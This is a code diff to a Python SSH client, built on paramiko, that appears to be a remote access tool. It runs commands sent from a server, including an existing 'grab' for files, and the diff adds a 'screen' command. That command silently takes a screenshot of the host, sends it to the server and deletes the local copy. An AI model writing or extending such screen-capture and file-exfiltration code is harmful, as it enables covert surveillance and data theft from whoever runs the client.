@@ -5,6 +5,7 @@ import sys
 import time
 
 import paramiko
+import pyautogui
 
 
 class Client:
@@ -15,20 +16,8 @@ class Client:
         self.server_port = server_port
 
     def connect_auth(self, username, password):
-        '''Try to connect to the server with ssh.
-
-        Params
-        -----
-        username: str
-            username for authorization
-        password: str
-            password for authorization
-
-        Return
-        -----
-        : bool
-            True on success authentication,
-            False otherwise
+        '''
+        Try to connect to the server with given username and password.
         '''
         try:
             self.client.connect(
@@ -60,6 +49,8 @@ class Client:
                 command = command.decode('utf-8')
                 if 'grab' in command:
                     cmd_result = grab(chan, command, verbose)
+                elif command == 'screen':
+                    cmd_result = send_screen(chan, verbose)
                 elif command == 'server stop':
                     try:
                         self.client.close()
@@ -144,6 +135,21 @@ def grab(chan, grab_command, out_loud=False):
     else:
         cmd_result = '4'
     return cmd_result
+
+
+def send_screen(chan, verbose):
+    '''Try to take a screenshot and send to the server.
+    '''
+    try:
+        pic = pyautogui.screenshot()
+        gmtime = time.gmtime()
+        sname = f'scr{gmtime[0]}{gmtime[1]}{gmtime[2]}{gmtime[3]}{gmtime[4]}{gmtime[5]}.png'
+        pic.save(sname)
+        result = send_files(chan, os.getcwd(), sname, verbose)
+        os.remove(os.path.join(os.getcwd(), sname))
+    except Exception:
+        result = '5'
+    return result
 
 
 def main():
